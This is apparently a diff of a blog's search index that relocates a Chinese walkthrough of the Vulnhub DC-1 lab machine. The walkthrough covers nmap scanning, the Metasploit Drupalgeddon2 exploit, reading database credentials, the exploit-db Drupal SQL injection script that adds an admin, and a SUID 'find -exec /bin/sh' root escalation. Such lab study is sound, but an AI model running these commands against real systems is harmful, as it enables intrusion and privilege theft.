@@ -178,6 +178,151 @@
       </tags>
   </entry>
   <entry>
+    <title>Vulnhub-DC-1渗透学习</title>
+    <url>/2022/06/08/Vulnhub-DC-1/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC-1：192.168.8.230</p>
+<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>启动靶机，由于我们没法进去这个靶机，所以IP地址是未知的</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/1.png" alt></p>
+<p>用<code>ifconfig</code>查看kali的IP地址</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/2.png" alt></p>
+<p>使用nmap对该网段下的主机进行主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br><span class="line">/24的意思是告诉nmap扫描192.168.8.0这一个网段,相当于192.168.8.0-255</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/3.png" alt></p>
+<p>一共发现了4个主机存活，最后一个是本机IP，因此可以不用考虑</p>
+<p>使用下面命令进行逐个扫描，根据它们所开放的端口等其他信息进行排查</p>
+<p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.8.230</span><br><span class="line">或</span><br><span class="line">nmap -A -p- 192.168.8.230</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/4.png" alt></p>
+<p>可以看到开放了80端口，打开浏览器进行访问</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/5.png" alt></p>
+<p>观察这个页面可以发现是Drupal框架，那么就可能存在这个框架所对应的漏洞</p>
+<p>如果看不出来的话，在kali上也可以利用<code>whatweb</code>来查看这个网站的各种信息</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/6.png" alt></p>
+<p>可以看到这是个Drupal 7.X的框架，浏览器查找可以看到有对应的漏洞</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/7.png" alt></p>
+<p>或者在msf里也可以找到可以利用的payload</p>
+<blockquote>
+<p>msf全称Metasploit Framework，是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode</p>
+</blockquote>
+<p>使用<code>msfconsole</code>即可进入msf</p>
+<p>检索这个框架的漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/8.png" alt></p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>经过我的测试发现第二个EXP还可以使用，而且能达到我们的目的</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2 //使用该EXP模块</span><br><span class="line">show options //查看需要设置的参数</span><br><span class="line">set RHOSTS 192.168.8.230 //设置被攻击的IP</span><br><span class="line">set LHOST 192.168.8.105 //设置监听IP，即本机IP</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/9.png" alt></p>
+<p>通过查看options确认配置好参数以后，使用<code>run</code>即可，攻击成功后msf会返回一个session</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/10.png" alt></p>
+<p> 我们可以利用这个session来查看各种信息，比如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid //查看当前用户</span><br><span class="line">sysinfo //查看当前系统版本</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/11.png" alt></p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>通过刚刚的session，使用<code>shell</code>获得系统的一个非交互式shell</p>
+<p><a href="https://blog.csdn.net/gui951753/article/details/79154496">深入浅出理解交互式shell和非交互式shell、登录shell和非登录shell的区别</a></p>
+<blockquote>
+<p>交互式shell就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。</p>
+<p> 非交互式shell，以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾EOF，shell也就终止了。</p>
+</blockquote>
+<p>因此为了方便我们之后的操作，我们需要利用python来把它转换成交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/12.png" alt></p>
+<p>然后就能很快发现第一个flag</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/13.png" alt></p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1中的内容提示我们要找CMS（即Drupal）的配置文件，浏览器检索就能看到配置文件的位置</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/14.png" alt></p>
+<p>打开这个配置文件就可以发现第二个flag</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/15.png" alt></p>
+<p>同时也发现了数据库的相关信息</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$databases</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>flag2中也有提示，提示我们不需要暴力破解，而是得到访问权限</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/16.png" alt></p>
+<p>由上面得到的数据库信息我们可以进入数据库中</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -p R0ck3t</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/17.png" alt></p>
+<p>对数据库进行常规操作</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/18.png" alt></p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/19.png" alt></p>
+<p>可以看到这里有管理员的账号和密码，但很明显，这里的密码经过了加密，无法直接使用，这里有两种方法可以得到管理员权限</p>
+<h3 id="方法1-重置管理员密码"><a href="#方法1-重置管理员密码" class="headerlink" title="方法1-重置管理员密码"></a>方法1-重置管理员密码</h3><p>网上也有相关的文章，因为我们已经登录了数据库，自然可以对数据库里的数据进行修改</p>
+<p><a href="https://blog.csdn.net/xieyanxy9/article/details/84118604">如何重置Drupal 7的用户密码</a></p>
+<p>在Drupal的安装目录中的scripts目录下，有一些Drupal开发者准备好的PHP脚本，其中里面有个password-hash.sh文件，该文件的功能就是接收一个密码（字符串），然后返回加密后的字符串</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;password-hash.sh&quot; //找到该文件的位置</span><br><span class="line">php /var/www/scripts/password-hash.sh 123456 //传入的密码为123456</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/20.png" alt></p>
+<p>然后只需要把这个新密码更新到用户admin中就可以实现重置密码，在数据库中使用下面的命令</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">update users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DKalQTXxpfdOP0QHC.bi8HxVb.AKt/bwbr0KUMQx6hiLPgZE/aYl&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/21.png" alt></p>
+<p>此时我们就可以登录后台了</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/22.png" alt></p>
+<p>在content里就能发现flag3</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/23.png" alt></p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/24.png" alt></p>
+<h3 id="方法2-添加具有管理员权限的用户"><a href="#方法2-添加具有管理员权限的用户" class="headerlink" title="方法2-添加具有管理员权限的用户"></a>方法2-添加具有管理员权限的用户</h3><p>首先我们得确定该Drupal的版本信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/25.png" alt></p>
+<p>然后利用kali自带的SearchSploit工具进行搜索</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/26.png" alt></p>
+<p>发现有个SQL注入的漏洞，可以添加管理员用户</p>
+<p>然后只需要使用python去执行这个py文件就可以实现添加管理员了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.8.230 -u aadmin -p 123456</span><br></pre></td></tr></table></figure>
+<p>出现下面的画面就代表我们已经添加成功了</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/27.png" alt></p>
+<p>查看一下数据库，发现成功在数据库中添加了管理员</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/28.png" alt></p>
+<p>之后再通过登录网站后台，就可以找到第三个flag了</p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>flag3中有提示关键词<strong>perms</strong>、<strong>find</strong>、<strong>passwd</strong>、<strong>-exec</strong></p>
+<p>因此查看passwd文件就可以找到flag4</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/29.png" alt></p>
+<p>这里还有一种方法，也就是使用find命令来查找</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;flag*.txt&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/30.png" alt></p>
+<p>这样也可以找到flag4</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/31.png" alt></p>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>flag4中说最后一个flag在root里，但在访问root的时候发现权限不够</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/32.png" alt></p>
+<p>因此我们需要把权限提升至root，再根据flag3里的perms和-exec，猜测可能会用到SUID提权</p>
+<blockquote>
+<p>SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件，对于非可执行文件设置SUID没有任何意义。</p>
+<p>简单来说就是非root用户在调用一个设置有SUID权限的可执行文件时，该进程的权限将为root权限</p>
+</blockquote>
+<p>那么如何知道什么可执行文件具有SUID权限呢，有以下几种</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 //最简单的一种</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>简单解释一下一些参数的意思</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u=s 表示查找root用户拥有的文件</span><br><span class="line">-type f 表示我们寻找的文件类型是常规文件</span><br><span class="line">2 表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt; 表示重定向</span><br><span class="line">/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">find基础命令与提权教程</a></p>
+<p>可以看到find命令有SUID权限，因此我们可以用find进行提权</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/33.png" alt></p>
+<blockquote>
+<p>常见的可以用来提权的程序有：nmap、vim、find、bash、more、less、nano、cp</p>
+</blockquote>
+<p>find提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find robots.txt -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
+<p>中间的robots.txt是一个能够找到的文件或者目录，否则可能会出错，执行了这个命令之后就可以看到权限提升到了root</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/34.png" alt></p>
+<p>然后再进入root目录就能看到最后一个flag的位置了</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/35.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_44276741/article/details/122365853">【Vulnhub-DC1】DC-1</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123433375?spm=1001.2014.3001.5501">dc-1 靶机渗透学习</a></p>
+<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">find基础命令与提权教程</a></p>
+<p><a href="https://blog.csdn.net/xieyanxy9/article/details/84118604">如何重置Drupal 7的用户密码</a></p>
+<p><a href="https://blog.csdn.net/gui951753/article/details/79154496">深入浅出理解交互式shell和非交互式shell、登录shell和非登录shell的区别</a></p>
+<p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶机</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnhub-DC-2渗透学习</title>
     <url>/2022/06/09/Vulnhub-DC-2/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
@@ -324,151 +469,6 @@
 <p><img src="/2022/06/09/Vulnhub-DC-2/29.png" alt></p>
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_45742511/article/details/114666974">靶机测试—DC（2）</a></p>
 <p><a href="https://blog.csdn.net/qq_61237064/article/details/123500520?spm=1001.2014.3001.5502">dc-2 靶机渗透学习</a></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vulnhub-DC-1渗透学习</title>
-    <url>/2022/06/08/Vulnhub-DC-1/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC-1：192.168.8.230</p>
-<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>启动靶机，由于我们没法进去这个靶机，所以IP地址是未知的</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/1.png" alt></p>
-<p>用<code>ifconfig</code>查看kali的IP地址</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/2.png" alt></p>
-<p>使用nmap对该网段下的主机进行主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br><span class="line">/24的意思是告诉nmap扫描192.168.8.0这一个网段,相当于192.168.8.0-255</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/3.png" alt></p>
-<p>一共发现了4个主机存活，最后一个是本机IP，因此可以不用考虑</p>
-<p>使用下面命令进行逐个扫描，根据它们所开放的端口等其他信息进行排查</p>
-<p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.8.230</span><br><span class="line">或</span><br><span class="line">nmap -A -p- 192.168.8.230</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/4.png" alt></p>
-<p>可以看到开放了80端口，打开浏览器进行访问</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/5.png" alt></p>
-<p>观察这个页面可以发现是Drupal框架，那么就可能存在这个框架所对应的漏洞</p>
-<p>如果看不出来的话，在kali上也可以利用<code>whatweb</code>来查看这个网站的各种信息</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/6.png" alt></p>
-<p>可以看到这是个Drupal 7.X的框架，浏览器查找可以看到有对应的漏洞</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/7.png" alt></p>
-<p>或者在msf里也可以找到可以利用的payload</p>
-<blockquote>
-<p>msf全称Metasploit Framework，是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode</p>
-</blockquote>
-<p>使用<code>msfconsole</code>即可进入msf</p>
-<p>检索这个框架的漏洞：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/8.png" alt></p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>经过我的测试发现第二个EXP还可以使用，而且能达到我们的目的</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2 //使用该EXP模块</span><br><span class="line">show options //查看需要设置的参数</span><br><span class="line">set RHOSTS 192.168.8.230 //设置被攻击的IP</span><br><span class="line">set LHOST 192.168.8.105 //设置监听IP，即本机IP</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/9.png" alt></p>
-<p>通过查看options确认配置好参数以后，使用<code>run</code>即可，攻击成功后msf会返回一个session</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/10.png" alt></p>
-<p> 我们可以利用这个session来查看各种信息，比如：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid //查看当前用户</span><br><span class="line">sysinfo //查看当前系统版本</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/11.png" alt></p>
-<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>通过刚刚的session，使用<code>shell</code>获得系统的一个非交互式shell</p>
-<p><a href="https://blog.csdn.net/gui951753/article/details/79154496">深入浅出理解交互式shell和非交互式shell、登录shell和非登录shell的区别</a></p>
-<blockquote>
-<p>交互式shell就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。</p>
-<p> 非交互式shell，以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾EOF，shell也就终止了。</p>
-</blockquote>
-<p>因此为了方便我们之后的操作，我们需要利用python来把它转换成交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/12.png" alt></p>
-<p>然后就能很快发现第一个flag</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/13.png" alt></p>
-<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1中的内容提示我们要找CMS（即Drupal）的配置文件，浏览器检索就能看到配置文件的位置</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/14.png" alt></p>
-<p>打开这个配置文件就可以发现第二个flag</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/15.png" alt></p>
-<p>同时也发现了数据库的相关信息</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$databases</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>flag2中也有提示，提示我们不需要暴力破解，而是得到访问权限</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/16.png" alt></p>
-<p>由上面得到的数据库信息我们可以进入数据库中</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -p R0ck3t</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/17.png" alt></p>
-<p>对数据库进行常规操作</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/18.png" alt></p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/19.png" alt></p>
-<p>可以看到这里有管理员的账号和密码，但很明显，这里的密码经过了加密，无法直接使用，这里有两种方法可以得到管理员权限</p>
-<h3 id="方法1-重置管理员密码"><a href="#方法1-重置管理员密码" class="headerlink" title="方法1-重置管理员密码"></a>方法1-重置管理员密码</h3><p>网上也有相关的文章，因为我们已经登录了数据库，自然可以对数据库里的数据进行修改</p>
-<p><a href="https://blog.csdn.net/xieyanxy9/article/details/84118604">如何重置Drupal 7的用户密码</a></p>
-<p>在Drupal的安装目录中的scripts目录下，有一些Drupal开发者准备好的PHP脚本，其中里面有个password-hash.sh文件，该文件的功能就是接收一个密码（字符串），然后返回加密后的字符串</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;password-hash.sh&quot; //找到该文件的位置</span><br><span class="line">php /var/www/scripts/password-hash.sh 123456 //传入的密码为123456</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/20.png" alt></p>
-<p>然后只需要把这个新密码更新到用户admin中就可以实现重置密码，在数据库中使用下面的命令</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">update users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DKalQTXxpfdOP0QHC.bi8HxVb.AKt/bwbr0KUMQx6hiLPgZE/aYl&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/21.png" alt></p>
-<p>此时我们就可以登录后台了</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/22.png" alt></p>
-<p>在content里就能发现flag3</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/23.png" alt></p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/24.png" alt></p>
-<h3 id="方法2-添加具有管理员权限的用户"><a href="#方法2-添加具有管理员权限的用户" class="headerlink" title="方法2-添加具有管理员权限的用户"></a>方法2-添加具有管理员权限的用户</h3><p>首先我们得确定该Drupal的版本信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/25.png" alt></p>
-<p>然后利用kali自带的SearchSploit工具进行搜索</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/26.png" alt></p>
-<p>发现有个SQL注入的漏洞，可以添加管理员用户</p>
-<p>然后只需要使用python去执行这个py文件就可以实现添加管理员了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.8.230 -u aadmin -p 123456</span><br></pre></td></tr></table></figure>
-<p>出现下面的画面就代表我们已经添加成功了</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/27.png" alt></p>
-<p>查看一下数据库，发现成功在数据库中添加了管理员</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/28.png" alt></p>
-<p>之后再通过登录网站后台，就可以找到第三个flag了</p>
-<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>flag3中有提示关键词<strong>perms</strong>、<strong>find</strong>、<strong>passwd</strong>、<strong>-exec</strong></p>
-<p>因此查看passwd文件就可以找到flag4</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/29.png" alt></p>
-<p>这里还有一种方法，也就是使用find命令来查找</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;flag*.txt&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/08/Vulnhub-DC-1/30.png" alt></p>
-<p>这样也可以找到flag4</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/31.png" alt></p>
-<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>flag4中说最后一个flag在root里，但在访问root的时候发现权限不够</p>
-<p><img src="/2022/06/08/Vulnhub-DC-1/32.png" alt></p>
-<p>因此我们需要把权限提升至root，再根据flag3里的perms和-exec，猜测可能会用到SUID提权</p>
-<blockquote>
-<p>SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件，对于非可执行文件设置SUID没有任何意义。</p>
-<p>简单来说就是非root用户在调用一个设置有SUID权限的可执行文件时，该进程的权限将为root权限</p>
-</blockquote>
-<p>那么如何知道什么可执行文件具有SUID权限呢，有以下几种</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 //最简单的一种</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>简单解释一下一些参数的意思</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u=s 表示查找root用户拥有的文件</span><br><span class="line">-type f 表示我们寻找的文件类型是常规文件</span><br><span class="line">2 表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt; 表示重定向</span><br><span class="line">/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
-<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">find基础命令与提权教程</a></p>
